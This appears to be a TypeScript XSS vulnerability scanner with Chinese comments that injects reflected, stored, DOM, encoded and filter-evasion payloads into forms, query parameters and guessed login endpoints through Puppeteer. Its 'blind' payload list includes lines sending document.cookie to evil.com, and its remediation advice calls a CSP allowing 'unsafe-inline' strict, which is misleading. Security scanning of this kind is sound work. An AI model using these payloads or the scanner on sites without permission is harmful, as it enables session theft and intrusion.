/**
 * XSS漏洞检测器
 * 本地化程度：100%
 * 检测反射型、存储型和DOM型XSS漏洞
 */

import cheerio from 'cheerio';
import puppeteer, { type Browser, type Page } from 'puppeteer';

interface XSSPayloads {
  basic: string[];
  evasion: string[];
  dom: string[];
  blind: string[];
  encoded: string[];
  context: {
    html: string[];
    attribute: string[];
    javascript: string[];
    css: string[];
  };
}

interface XSSResult {
  url: string;
  timestamp: Date;
  vulnerable: boolean;
  severity: 'low' | 'medium' | 'high' | 'critical';
  vulnerabilities: XSSVulnerability[];
  summary: {
    totalTests: number;
    vulnerableTests: number;
    payloadCategories: Record<string, number>;
  };
  recommendations: XSSRecommendation[];
}

interface XSSVulnerability {
  type: string;
  payload: string;
  parameter: string;
  method: string;
  evidence: string;
  severity: 'low' | 'medium' | 'high' | 'critical';
  description: string;
  impact: string;
  remediation: string;
  context: string;
}

interface XSSRecommendation {
  priority: 'high' | 'medium' | 'low';
  title: string;
  description: string;
  category: string;
  effort: 'low' | 'medium' | 'high';
  examples: CodeExample[];
}

interface CodeExample {
  title: string;
  language: string;
  code: string;
  explanation: string;
}

class XSSAnalyzer {
  private payloads: XSSPayloads;

  constructor() {
    // XSS测试载荷
    this.payloads = {
      // 基础XSS测试
      basic: [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        '<svg onload=alert("XSS")>',
        '<iframe src="javascript:alert(\'XSS\')">',
        '<body onload=alert("XSS")>',
        '<input onfocus=alert("XSS") autofocus>',
        '<select onfocus=alert("XSS") autofocus>',
        '<textarea onfocus=alert("XSS") autofocus>',
        '<keygen onfocus=alert("XSS") autofocus>',
        '<video><source onerror="alert(\'XSS\')">',
      ],

      // 绕过过滤器的载荷
      evasion: [
        '<ScRiPt>alert("XSS")</ScRiPt>',
        '<script>alert(String.fromCharCode(88,83,83))</script>',
        '<img src="javascript:alert(\'XSS\')">',
        '<img src=# onerror=alert("XSS")>',
        '<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">',
        '<script>\\u0061\\u006c\\u0065\\u0072\\u0074(\\u0022\\u0058\\u0053\\u0053\\u0022)</script>',
        '<script>alert(/XSS/)</script>',
        "<script>alert('XSS')</script>",
        '<script>alert("XSS")</script>',
        '<script>alert&#40;"XSS"&#41;</script>',
      ],

      // DOM型XSS测试
      dom: [
        '#<script>alert("XSS")</script>',
        'javascript:alert("XSS")',
        '<img src="x" onerror="alert(document.domain)">',
        '<script>document.write("<script>alert(\'XSS\')</script>")</script>',
        '<script>eval("alert(\'XSS\')")</script>',
        '<script>setTimeout("alert(\'XSS\')",100)</script>',
        '<script>Function("alert(\'XSS\')")()</script>',
        '<script>[1].map(alert)</script>',
        '<script>alert(location.href)</script>',
        '<script>alert(document.cookie)</script>',
      ],

      // 盲注测试
      blind: [
        '<script>fetch("http://evil.com/steal?data="+document.cookie)</script>',
        '<script>new Image().src="http://evil.com/steal?data="+document.cookie</script>',
        '<script>var x=new XMLHttpRequest();x.open("GET","http://evil.com/steal?data="+document.cookie);x.send()</script>',
        '<script>navigator.sendBeacon("http://evil.com/steal",document.cookie)</script>',
        '<script>localStorage.setItem("xss","test")</script>',
        '<script>sessionStorage.setItem("xss","test")</script>',
        '<script>document.title="XSS"</script>',
        '<script>window.name="XSS"</script>',
      ],

      // 编码载荷
      encoded: [
        '%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E',
        '%3Cimg%20src%3Dx%20onerror%3Dalert%28%22XSS%22%29%3E',
        '%26%23x3C%3Bscript%26%23x3E%3Balert%26%23x28%3B%26quot%3BXSS%26quot%3B%26%23x29%3B%26%23x3C%3B%2Fscript%26%23x3E%3B',
        '&#60;script&#62;alert&#40;&#34;XSS&#34;&#41;&#60;&#47;script&#62;',
        '&#x3C;script&#x3E;alert&#x28;&#x22;XSS&#x22;&#x29;&#x3C;&#x2F;script&#x3E;',
        'javascript:alert%28%22XSS%22%29',
        'data:text/html,%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E',
      ],

      // 上下文相关载荷
      context: {
        html: [
          '<script>alert("XSS")</script>',
          '<img src=x onerror=alert("XSS")>',
          '<svg onload=alert("XSS")>',
          '<iframe src="javascript:alert(\'XSS\')">',
          '<body onload=alert("XSS")>',
        ],
        attribute: [
          '" onmouseover="alert(\'XSS\')" ',
          "' onmouseover='alert(\"XSS\")' ",
          'javascript:alert("XSS")',
          'data:text/html,<script>alert("XSS")</script>',
          '" onclick="alert(\'XSS\')" ',
        ],
        javascript: [
          '\';alert("XSS");//',
          '";alert("XSS");//',
          '\'};alert("XSS");//',
          '"};alert("XSS");//',
          'alert("XSS")',
          'eval("alert(\'XSS\')")',
        ],
        css: [
          'expression(alert("XSS"))',
          'url("javascript:alert(\'XSS\')")',
          'behavior:url(#default#anchorClick)',
          '@import "javascript:alert(\'XSS\')";',
          "background:url(javascript:alert('XSS'))",
        ],
      },
    };
  }

  /**
   * 分析XSS漏洞
   */
  async analyze(
    url: string,
    options: {
      timeout?: number;
      userAgent?: string;
      viewport?: { width: number; height: number };
      testParameters?: string[];
      testHeaders?: boolean;
      testCookies?: boolean;
      delay?: number;
      headless?: boolean;
    } = {}
  ): Promise<XSSResult> {
    const {
      timeout = 30000,
      userAgent = 'XSSAnalyzer/1.0',
      viewport = { width: 1920, height: 1080 },
      testParameters = [],
      testHeaders = true,
      testCookies = true,
      delay = 100,
      headless = true,
    } = options;

    const vulnerabilities: XSSVulnerability[] = [];
    const timestamp = new Date();

    try {
      // 发现测试点
      const testPoints = await this.discoverTestPoints(url, {
        timeout,
        userAgent,
        testParameters,
        testHeaders,
        testCookies,
      });

      // 测试反射型XSS
      for (const testPoint of testPoints) {
        const reflectedResults = await this.testReflectedXSS(testPoint, delay, {
          viewport,
          headless,
        });
        vulnerabilities.push(...reflectedResults);
      }

      // 测试DOM型XSS
      const domResults = await this.testDOMBasedXSS(url, {
        viewport,
        headless,
        timeout,
      });
      vulnerabilities.push(...domResults);

      // 测试存储型XSS
      const storedResults = await this.testStoredXSS(url, testPoints, delay, {
        viewport,
        headless,
        timeout,
      });
      vulnerabilities.push(...storedResults);

      // 生成建议
      const recommendations = this.generateRecommendations(vulnerabilities);

      // 计算摘要
      const summary = this.generateSummary(vulnerabilities);

      return {
        url,
        timestamp,
        vulnerable: vulnerabilities.length > 0,
        severity: this.calculateOverallSeverity(vulnerabilities),
        vulnerabilities,
        summary,
        recommendations,
      };
    } catch (error) {
      throw new Error(`XSS分析失败: ${error instanceof Error ? error.message : String(error)}`);
    }
  }

  /**
   * 发现测试点
   */
  private async discoverTestPoints(
    url: string,
    options: {
      timeout: number;
      userAgent: string;
      testParameters: string[];
      testHeaders: boolean;
      testCookies: boolean;
    }
  ): Promise<
    Array<{
      url: string;
      method: string;
      parameters: Array<{
        name: string;
        type: 'query' | 'form' | 'header' | 'cookie';
        value: string;
      }>;
    }>
  > {
    const testPoints: Array<{
      url: string;
      method: string;
      parameters: Array<{
        name: string;
        type: 'query' | 'form' | 'header' | 'cookie';
        value: string;
      }>;
    }> = [];

    try {
      // 分析URL参数
      const urlObj = new URL(url);
      const queryParams: Array<{ name: string; type: 'query'; value: string }> = [];

      urlObj.searchParams.forEach((value, name) => {
        queryParams.push({ name, type: 'query', value });
      });

      if (queryParams.length > 0) {
        testPoints.push({
          url: urlObj.origin + urlObj.pathname,
          method: 'GET',
          parameters: queryParams,
        });
      }

      // 分析表单
      const forms = await this.discoverForms(url, options);
      forms.forEach(form => {
        testPoints.push(form);
      });

      // 分析API端点
      const apiEndpoints = await this.discoverAPIEndpoints(url, options);
      apiEndpoints.forEach(endpoint => {
        testPoints.push(endpoint);
      });

      return testPoints;
    } catch (error) {
      console.error('发现测试点失败:', error);
      return [];
    }
  }

  /**
   * 发现表单
   */
  private async discoverForms(
    url: string,
    options: {
      timeout: number;
      userAgent: string;
    }
  ): Promise<
    Array<{
      url: string;
      method: string;
      parameters: Array<{
        name: string;
        type: 'query' | 'form' | 'header' | 'cookie';
        value: string;
      }>;
    }>
  > {
    try {
      const response = await fetch(url, {
        headers: {
          'User-Agent': options.userAgent,
        },
      });

      const html = await response.text();
      const forms: Array<{
        url: string;
        method: string;
        parameters: Array<{
          name: string;
          type: 'form';
          value: string;
        }>;
      }> = [];

      const $ = cheerio.load(html);
      $('form').each((_, formElement) => {
        const form = $(formElement);
        const method = (form.attr('method') || 'GET').toUpperCase();
        const action = form.attr('action') || url;
        const formUrl = new URL(action, url).toString();
        const parameters: Array<{ name: string; type: 'form'; value: string }> = [];

        form.find('input, select, textarea').each((_, fieldElement) => {
          const field = $(fieldElement);
          const name = field.attr('name');
          if (!name) return;

          const tagName = fieldElement.tagName.toLowerCase();
          if (tagName === 'input') {
            const inputType = (field.attr('type') || 'text').toLowerCase();
            if (['submit', 'button', 'reset', 'image', 'file'].includes(inputType)) {
              return;
            }
          }

          let value = field.attr('value') || '';
          if (tagName === 'textarea') {
            value = field.text() || value;
          }
          if (tagName === 'select') {
            const selected = field.find('option:selected');
            value = selected.attr('value') || selected.text() || value;
          }

          parameters.push({
            name,
            type: 'form',
            value: value || 'test',
          });
        });

        if (parameters.length > 0) {
          forms.push({
            url: formUrl,
            method,
            parameters,
          });
        }
      });

      return forms;
    } catch (error) {
      console.error('发现表单失败:', error);
      return [];
    }
  }

  /**
   * 发现API端点
   */
  private async discoverAPIEndpoints(
    url: string,
    _options: {
      timeout: number;
      userAgent: string;
    }
  ): Promise<
    Array<{
      url: string;
      method: string;
      parameters: Array<{
        name: string;
        type: 'query' | 'form' | 'header' | 'cookie';
        value: string;
      }>;
    }>
  > {
    const commonEndpoints = [
      '/api/login',
      '/api/auth',
      '/api/users',
      '/api/search',
      '/api/data',
      '/login',
      '/auth',
      '/search',
      '/data',
    ];

    const endpoints: Array<{
      url: string;
      method: string;
      parameters: Array<{
        name: string;
        type: 'query' | 'form' | 'header' | 'cookie';
        value: string;
      }>;
    }> = [];

    for (const endpoint of commonEndpoints) {
      const testUrl = new URL(endpoint, url).toString();

      // 测试GET端点
      endpoints.push({
        url: testUrl,
        method: 'GET',
        parameters: [
          { name: 'id', type: 'query', value: '1' },
          { name: 'search', type: 'query', value: 'test' },
        ],
      });

      // 测试POST端点
      endpoints.push({
        url: testUrl,
        method: 'POST',
        parameters: [
          { name: 'username', type: 'form', value: 'test' },
          { name: 'password', type: 'form', value: 'test' },
        ],
      });
    }

    return endpoints;
  }

  /**
   * 测试反射型XSS
   */
  private async testReflectedXSS(
    testPoint: {
      url: string;
      method: string;
      parameters: Array<{
        name: string;
        type: 'query' | 'form' | 'header' | 'cookie';
        value: string;
      }>;
    },
    delay: number,
    browserOptions: {
      viewport: { width: number; height: number };
      headless: boolean;
    }
  ): Promise<XSSVulnerability[]> {
    const vulnerabilities: XSSVulnerability[] = [];
    let browser: Browser | null = null;
    let page: Page | null = null;

    try {
      browser = await puppeteer.launch({
        headless: browserOptions.headless,
        args: ['--no-sandbox', '--disable-setuid-sandbox'],
      });

      page = await browser.newPage();
      await page.setViewport(browserOptions.viewport);

      for (const parameter of testPoint.parameters) {
        // 测试基础XSS
        const basicResults = await this.testBasicXSS(page, testPoint, parameter, delay);
        vulnerabilities.push(...basicResults);

        // 测试绕过载荷
        const evasionResults = await this.testEvasionXSS(page, testPoint, parameter, delay);
        vulnerabilities.push(...evasionResults);

        // 测试编码载荷
        const encodedResults = await this.testEncodedXSS(page, testPoint, parameter, delay);
        vulnerabilities.push(...encodedResults);
      }
    } catch (error) {
      console.error('反射型XSS测试失败:', error);
    } finally {
      if (page) await page.close();
      if (browser) await browser.close();
    }

    return vulnerabilities;
  }

  /**
   * 测试DOM型XSS
   */
  private async testDOMBasedXSS(
    url: string,
    browserOptions: {
      viewport: { width: number; height: number };
      headless: boolean;
      timeout: number;
    }
  ): Promise<XSSVulnerability[]> {
    const vulnerabilities: XSSVulnerability[] = [];
    let browser: Browser | null = null;
    let page: Page | null = null;

    try {
      browser = await puppeteer.launch({
        headless: browserOptions.headless,
        args: ['--no-sandbox', '--disable-setuid-sandbox'],
      });

      page = await browser.newPage();
      await page.setViewport(browserOptions.viewport);

      // 设置XSS监听器
      await page.evaluateOnNewDocument(() => {
        const xssWindow = window as unknown as {
          xssDetected: boolean;
          xssPayload: string;
        };
        xssWindow.xssDetected = false;
        xssWindow.xssPayload = '';

        // 监听alert
        const originalAlert = window.alert;
        window.alert = function (message) {
          const currentWindow = window as unknown as {
            xssDetected: boolean;
            xssPayload: string;
          };
          currentWindow.xssDetected = true;
          currentWindow.xssPayload = message;
          return originalAlert.call(this, message);
        };

        // 监听console.log
        const originalLog = console.log;
        console.log = function (...args) {
          if (args[0] === 'XSS') {
            const currentWindow = window as unknown as {
              xssDetected: boolean;
              xssPayload: string;
            };
            currentWindow.xssDetected = true;
            currentWindow.xssPayload = args.join(' ');
          }
          return originalLog.apply(this, args);
        };
      });

      // 测试DOM型XSS载荷
      for (const payload of this.payloads.dom) {
        try {
          const testUrl = `${url}${url.includes('?') ? '&' : '?'}test=${encodeURIComponent(payload)}`;

          await page.goto(testUrl, { waitUntil: 'networkidle0', timeout: browserOptions.timeout });

          // 检查XSS是否触发
          const xssDetected = await page.evaluate(() => {
            const xssWindow = window as unknown as {
              xssDetected?: boolean;
            };
            return xssWindow.xssDetected ?? false;
          });
          const xssPayload = await page.evaluate(() => {
            const xssWindow = window as unknown as {
              xssPayload?: string;
            };
            return xssWindow.xssPayload ?? '';
          });

          if (xssDetected) {
            vulnerabilities.push({
              type: 'dom-based',
              payload,
              parameter: 'test',
              method: 'GET',
              evidence: xssPayload,
              severity: 'high',
              description: '发现DOM型XSS漏洞',
              impact: '攻击者可以执行任意JavaScript代码',
              remediation: '对用户输入进行严格验证和编码',
              context: 'DOM',
            });
          }
        } catch {
          // 忽略单个测试的错误
        }
      }
    } catch (error) {
      console.error('DOM型XSS测试失败:', error);
    } finally {
      if (page) await page.close();
      if (browser) await browser.close();
    }

    return vulnerabilities;
  }

  /**
   * 测试存储型XSS
   */
  private async testStoredXSS(
    url: string,
    testPoints: Array<{
      url: string;
      method: string;
      parameters: Array<{
        name: string;
        type: 'query' | 'form' | 'header' | 'cookie';
        value: string;
      }>;
    }>,
    delay: number,
    browserOptions: {
      viewport: { width: number; height: number };
      headless: boolean;
      timeout: number;
    }
  ): Promise<XSSVulnerability[]> {
    const vulnerabilities: XSSVulnerability[] = [];
    let browser: Browser | null = null;
    let page: Page | null = null;

    try {
      browser = await puppeteer.launch({
        headless: browserOptions.headless,
        args: ['--no-sandbox', '--disable-setuid-sandbox'],
      });

      page = await browser.newPage();
      await page.setViewport(browserOptions.viewport);

      // 设置XSS监听器
      await page.evaluateOnNewDocument(() => {
        const xssWindow = window as unknown as {
          xssDetected: boolean;
          xssPayload: string;
        };
        xssWindow.xssDetected = false;
        xssWindow.xssPayload = '';

        const originalAlert = window.alert;
        window.alert = function (message) {
          const currentWindow = window as unknown as {
            xssDetected: boolean;
            xssPayload: string;
          };
          currentWindow.xssDetected = true;
          currentWindow.xssPayload = message;
          return originalAlert.call(this, message);
        };
      });

      // 测试表单提交
      const forms = testPoints.filter(tp => tp.method === 'POST');
      for (const form of forms) {
        for (const payload of this.payloads.basic.slice(0, 3)) {
          // 只测试前3个载荷
          try {
            // 提交恶意载荷
            const formData: Record<string, string> = {};
            form.parameters.forEach(param => {
              formData[param.name] = payload;
            });

            await page.goto(form.url, {
              waitUntil: 'networkidle0',
              timeout: browserOptions.timeout,
            });

            // 填写表单
            await page.evaluate((data: Record<string, string>) => {
              Object.keys(data).forEach(key => {
                const input = document.querySelector<
                  HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement
                >(`[name="${key}"]`);
                if (input) {
                  input.value = data[key];
                }
              });
            }, formData);

            // 提交表单
            await Promise.all([
              page.waitForNavigation({
                waitUntil: 'networkidle0',
                timeout: browserOptions.timeout,
              }),
              page.click('button[type="submit"], input[type="submit"]'),
            ]);

            // 检查XSS是否触发
            const xssDetected = await page.evaluate(() => {
              const xssWindow = window as unknown as {
                xssDetected?: boolean;
              };
              return xssWindow.xssDetected ?? false;
            });
            const xssPayload = await page.evaluate(() => {
              const xssWindow = window as unknown as {
                xssPayload?: string;
              };
              return xssWindow.xssPayload ?? '';
            });

            if (xssDetected) {
              vulnerabilities.push({
                type: 'stored',
                payload,
                parameter: form.parameters.map(p => p.name).join(','),
                method: form.method,
                evidence: xssPayload,
                severity: 'critical',
                description: '发现存储型XSS漏洞',
                impact: '攻击者可以持久化执行恶意代码',
                remediation: '对存储和显示的用户输入进行严格过滤',
                context: 'storage',
              });
              break; // 发现一个就够了
            }
          } catch {
            // 忽略单个测试的错误
          }
        }
      }
    } catch (error) {
      console.error('存储型XSS测试失败:', error);
    } finally {
      if (page) await page.close();
      if (browser) await browser.close();
    }

    return vulnerabilities;
  }

  /**
   * 测试基础XSS
   */
  private async testBasicXSS(
    page: Page,
    testPoint: {
      url: string;
      method: string;
      parameters: Array<{
        name: string;
        type: 'query' | 'form' | 'header' | 'cookie';
        value: string;
      }>;
    },
    parameter: {
      name: string;
      type: 'query' | 'form' | 'header' | 'cookie';
      value: string;
    },
    delay: number
  ): Promise<XSSVulnerability[]> {
    const vulnerabilities: XSSVulnerability[] = [];

    // 设置XSS监听器
    await page.evaluateOnNewDocument(() => {
      const xssWindow = window as unknown as {
        xssDetected: boolean;
        xssPayload: string;
      };
      xssWindow.xssDetected = false;
      xssWindow.xssPayload = '';

      const originalAlert = window.alert;
      window.alert = function (message) {
        const currentWindow = window as unknown as {
          xssDetected: boolean;
          xssPayload: string;
        };
        currentWindow.xssDetected = true;
        currentWindow.xssPayload = message;
        return originalAlert.call(this, message);
      };
    });

    for (const payload of this.payloads.basic) {
      try {
        await this.sendRequest(page, testPoint, parameter, payload);

        // 检查XSS是否触发
        const xssDetected = await page.evaluate(() => {
          const xssWindow = window as unknown as { xssDetected?: boolean };
          return xssWindow.xssDetected ?? false;
        });
        const xssPayload = await page.evaluate(() => {
          const xssWindow = window as unknown as { xssPayload?: string };
          return xssWindow.xssPayload ?? '';
        });

        if (xssDetected) {
          vulnerabilities.push({
            type: 'reflected',
            payload,
            parameter: parameter.name,
            method: testPoint.method,
            evidence: xssPayload,
            severity: 'high',
            description: '发现反射型XSS漏洞',
            impact: '攻击者可以执行任意JavaScript代码',
            remediation: '对用户输入进行HTML编码',
            context: 'reflection',
          });
        }
      } catch {
        // 忽略单个测试的错误
      }

      await this.sleep(delay);
    }

    return vulnerabilities;
  }

  /**
   * 测试绕过载荷
   */
  private async testEvasionXSS(
    page: Page,
    testPoint: {
      url: string;
      method: string;
      parameters: Array<{
        name: string;
        type: 'query' | 'form' | 'header' | 'cookie';
        value: string;
      }>;
    },
    parameter: {
      name: string;
      type: 'query' | 'form' | 'header' | 'cookie';
      value: string;
    },
    delay: number
  ): Promise<XSSVulnerability[]> {
    const vulnerabilities: XSSVulnerability[] = [];

    for (const payload of this.payloads.evasion) {
      try {
        await this.sendRequest(page, testPoint, parameter, payload);

        // 检查XSS是否触发
        const xssDetected = await page.evaluate(() => {
          const xssWindow = window as unknown as { xssDetected?: boolean };
          return xssWindow.xssDetected ?? false;
        });
        const xssPayload = await page.evaluate(() => {
          const xssWindow = window as unknown as { xssPayload?: string };
          return xssWindow.xssPayload ?? '';
        });

        if (xssDetected) {
          vulnerabilities.push({
            type: 'reflected',
            payload,
            parameter: parameter.name,
            method: testPoint.method,
            evidence: xssPayload,
            severity: 'high',
            description: '发现XSS过滤器绕过',
            impact: '攻击者可以绕过XSS保护机制',
            remediation: '使用成熟的XSS防护库',
            context: 'evasion',
          });
        }
      } catch {
        // 忽略单个测试的错误
      }

      await this.sleep(delay);
    }

    return vulnerabilities;
  }

  /**
   * 测试编码载荷
   */
  private async testEncodedXSS(
    page: Page,
    testPoint: {
      url: string;
      method: string;
      parameters: Array<{
        name: string;
        type: 'query' | 'form' | 'header' | 'cookie';
        value: string;
      }>;
    },
    parameter: {
      name: string;
      type: 'query' | 'form' | 'header' | 'cookie';
      value: string;
    },
    delay: number
  ): Promise<XSSVulnerability[]> {
    const vulnerabilities: XSSVulnerability[] = [];

    for (const payload of this.payloads.encoded) {
      try {
        await this.sendRequest(page, testPoint, parameter, payload);

        // 检查XSS是否触发
        const xssDetected = await page.evaluate(() => {
          const xssWindow = window as unknown as { xssDetected?: boolean };
          return xssWindow.xssDetected ?? false;
        });
        const xssPayload = await page.evaluate(() => {
          const xssWindow = window as unknown as { xssPayload?: string };
          return xssWindow.xssPayload ?? '';
        });

        if (xssDetected) {
          vulnerabilities.push({
            type: 'reflected',
            payload,
            parameter: parameter.name,
            method: testPoint.method,
            evidence: xssPayload,
            severity: 'medium',
            description: '发现编码绕过XSS',
            impact: '攻击者可以通过编码绕过过滤器',
            remediation: '对解码后的输入进行验证',
            context: 'encoding',
          });
        }
      } catch {
        // 忽略单个测试的错误
      }

      await this.sleep(delay);
    }

    return vulnerabilities;
  }

  /**
   * 发送请求
   */
  private async sendRequest(
    page: Page,
    testPoint: {
      url: string;
      method: string;
      parameters: Array<{
        name: string;
        type: 'query' | 'form' | 'header' | 'cookie';
        value: string;
      }>;
    },
    parameter: {
      name: string;
      type: 'query' | 'form' | 'header' | 'cookie';
      value: string;
    },
    payload: string
  ): Promise<void> {
    // 重置XSS检测状态
    await page.evaluate(() => {
      const xssWindow = window as unknown as {
        xssDetected: boolean;
        xssPayload: string;
      };
      xssWindow.xssDetected = false;
      xssWindow.xssPayload = '';
    });

    // 准备请求参数
    const params: Record<string, string> = {};
    const data: Record<string, string> = {};

    for (const param of testPoint.parameters) {
      if (param.name === parameter.name) {
        const value = payload;

        switch (param.type) {
          case 'query':
            params[param.name] = value;
            break;
          case 'form':
            data[param.name] = value;
            break;
          case 'header':
            await page.setExtraHTTPHeaders({ [param.name]: value });
            break;
          case 'cookie':
            await page.setCookie({ name: param.name, value });
            break;
        }
      } else {
        switch (param.type) {
          case 'query':
            params[param.name] = param.value;
            break;
          case 'form':
            data[param.name] = param.value;
            break;
        }
      }
    }

    if (testPoint.method === 'GET') {
      const url = new URL(testPoint.url);
      Object.keys(params).forEach(key => {
        url.searchParams.set(key, params[key]);
      });
      await page.goto(url.toString(), { waitUntil: 'networkidle0' });
    } else {
      await page.goto(testPoint.url, { waitUntil: 'networkidle0' });
      await page.evaluate((data: Record<string, string>) => {
        Object.keys(data).forEach(key => {
          const input = document.querySelector<
            HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement
          >(`[name="${key}"]`);
          if (input) {
            input.value = data[key];
          }
        });
      }, data);
      await page.click('button[type="submit"], input[type="submit"]');
    }
  }

  /**
   * 生成建议
   */
  private generateRecommendations(vulnerabilities: XSSVulnerability[]): XSSRecommendation[] {
    const recommendations: XSSRecommendation[] = [];

    if (vulnerabilities.length > 0) {
      recommendations.push({
        priority: 'high',
        title: '输入验证和输出编码',
        description: '对所有用户输入进行严格验证，对所有输出进行适当编码',
        category: 'prevention',
        effort: 'medium',
        examples: [
          {
            title: 'HTML编码',
            language: 'javascript',
            code: `function encodeHTML(str) {
  return str.replace(/[&<>"']/g, function(match) {
    const escape = {
      '&': '&amp;',
      '<': '&lt;',
      '>': '&gt;',
      '"': '&quot;',
      "'": '&#39;'
    };
    return escape[match];
  });
}`,
            explanation: '对用户输入进行HTML编码',
          },
          {
            title: '使用DOMPurify',
            language: 'javascript',
            code: `import DOMPurify from 'dompurify';

const clean = DOMPurify.sanitize(userInput);
document.getElementById('output').innerHTML = clean;`,
            explanation: '使用成熟的XSS防护库',
          },
        ],
      });

      recommendations.push({
        priority: 'high',
        title: '内容安全策略(CSP)',
        description: '实施内容安全策略来限制脚本执行',
        category: 'csp',
        effort: 'low',
        examples: [
          {
            title: 'CSP头部设置',
            language: 'http',
            code: `Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:;`,
            explanation: '设置严格的CSP策略',
          },
        ],
      });

      recommendations.push({
        priority: 'medium',
        title: '使用安全的API',
        description: '避免使用危险的DOM API，使用安全的替代方案',
        category: 'secure-coding',
        effort: 'medium',
        examples: [
          {
            title: '安全的DOM操作',
            language: 'javascript',
            code: `// 危险的方式
element.innerHTML = userInput;

// 安全的方式
element.textContent = userInput;

// 如果需要HTML，使用DOMPurify
element.innerHTML = DOMPurify.sanitize(userInput);`,
            explanation: '使用安全的DOM API',
          },
        ],
      });
    }

    return recommendations;
  }

  /**
   * 生成摘要
   */
  private generateSummary(vulnerabilities: XSSVulnerability[]): {
    totalTests: number;
    vulnerableTests: number;
    payloadCategories: Record<string, number>;
  } {
    const payloadCategories: Record<string, number> = {};

    vulnerabilities.forEach(vuln => {
      payloadCategories[vuln.type] = (payloadCategories[vuln.type] || 0) + 1;
    });

    return {
      totalTests: Object.values(this.payloads).flat().length,
      vulnerableTests: vulnerabilities.length,
      payloadCategories,
    };
  }

  /**
   * 计算总体严重程度
   */
  private calculateOverallSeverity(
    vulnerabilities: XSSVulnerability[]
  ): 'low' | 'medium' | 'high' | 'critical' {
    if (vulnerabilities.length === 0) {
      return 'low';
    }

    const severityCounts = {
      critical: vulnerabilities.filter(v => v.severity === 'critical').length,
      high: vulnerabilities.filter(v => v.severity === 'high').length,
      medium: vulnerabilities.filter(v => v.severity === 'medium').length,
      low: vulnerabilities.filter(v => v.severity === 'low').length,
    };

    if (severityCounts.critical > 0) {
      return 'critical';
    } else if (severityCounts.high > 0) {
      return 'high';
    } else if (severityCounts.medium > 0) {
      return 'medium';
    } else {
      return 'low';
    }
  }

  /**
   * 延迟函数
   */
  private sleep(ms: number): Promise<void> {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

  /**
   * 获取载荷配置
   */
  getPayloads(): XSSPayloads {
    return { ...this.payloads };
  }

  /**
   * 设置载荷配置
   */
  setPayloads(payloads: Partial<XSSPayloads>): void {
    this.payloads = { ...this.payloads, ...payloads };
  }

  /**
   * 导出分析报告
   */
  exportReport(result: XSSResult): string {
    return JSON.stringify(
      {
        timestamp: new Date().toISOString(),
        result,
        payloads: this.payloads,
      },
      null,
      2
    );
  }
}

export default XSSAnalyzer;
